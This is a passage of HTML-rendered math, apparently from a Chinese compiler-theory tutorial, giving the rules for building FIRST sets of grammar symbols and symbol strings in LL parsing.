class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>（其中，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mn>1</mn></msub><mtext>，</mtext><msub><mi>Y</mi><mn>2</mn></msub><mtext>，</mtext><mo>…</mo><mtext>，</mtext><msub><mi>Y</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">Y_1，Y_2，…，Y_{i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></eq>都是非终结符，且<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mn>1</mn></msub><msub><mi>Y</mi><mn>2</mn></msub><mo>…</mo><msub><mi>Y</mi><mrow><mi>i</mi><mtext>–</mtext><mn>1</mn></mrow></msub><msup><mo>→</mo><mo>∗</mo></msup><mo stretchy="false">{</mo><mi>ϵ</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">Y_1Y_2…Y_{i–1}\rightarrow^*\{\epsilon\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8387em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mtight">–1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">→</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">ϵ</span><span class="mclose">}</span></span></span></span></eq>则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><msub><mi>Y</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>−</mo><mo stretchy="false">{</mo><mi>ϵ</mi><mo stretchy="false">}</mo><mo>⊂</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">FIRST(Y_i)-\{\epsilon\}\subset FIRST(X);</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">ϵ</span><span class="mclose">}</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mpunct">;</span></span></span></span></eq>如果<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mn>1</mn></msub><msub><mi>Y</mi><mn>2</mn></msub><mo>…</mo><msub><mi>Y</mi><mi>k</mi></msub><msup><mo>→</mo><mo lspace="0em" rspace="0em">∗</mo></msup><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">Y_1Y_2…Y_k\rightarrow^{*}\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8387em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">→</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>，则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi><mo>∈</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\epsilon \in FIRST(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">ϵ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span></eq>。</li></ol></li></ul></li><li>若 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>V</mi><mi>U</mi></msub><mo>⋃</mo><msub><mi>V</mi><mi>T</mi></msub><msup><mo stretchy="false">)</mo><mo>∗</mo></msup><mo separator="true">,</mo><mi>α</mi><mo>=</mo><msub><mi>X</mi><mn>1</mn></msub><msub><mi>X</mi><mn>2</mn></msub><msub><mi>X</mi><mn>3</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>X</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">\alpha=(V_U \bigcup V_T)^*,\alpha = X_1X_2X_3..X_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">⋃</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIRST(\alpha)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span></span></span></span></eq>构造为<ul><li><ol><li>若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mo>=</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\alpha=\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>,显然<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mi>ϵ</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">FIRST(\alpha)=\{\epsilon\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">ϵ</span><span class="mclose">}</span></span></span></span></eq></li></ol></li><li><ol start="2"><li>若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mo>≠</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\alpha\not=\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>,则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>则</mtext><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>−</mo><mo stretchy="false">{</mo><mi>ϵ</mi><mo stretchy="false">}</mo><mo>⊂</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo><mtext>；</mtext></mrow><annotation encoding="application/x-tex">则FIRST(X_1)-\{\epsilon\}\subset FIRST(\alpha)；</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">则</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">ϵ</span><span class="mclose">}</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span><span class="mord cjk_fallback">；</span></span></span></span></eq></li></ol></li><li><ol start="3"><li>若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mo>≠</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\alpha\not=\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>,且<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mn>1</mn></msub><msub><mi>X</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>X</mi><mi>n</mi></msub><msup><mo>→</mo><mo lspace="0em" rspace="0em">∗</mo></msup><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">X_1X_2..X_n\rightarrow^{*}\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8387em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">→</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>,则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>−</mo><mo stretchy="false">{</mo><mi>ϵ</mi><mo stretchy="false">}</mo><mo>⊂</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIRST(X_i)-\{\epsilon\}\subset FIRST(\alpha)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">ϵ</span><span class="mclose">}</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span></span></span></span></eq></li></ol></li><li><ol start="4"><li>若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mo>≠</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\alpha\not =\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2778em;"></span><span 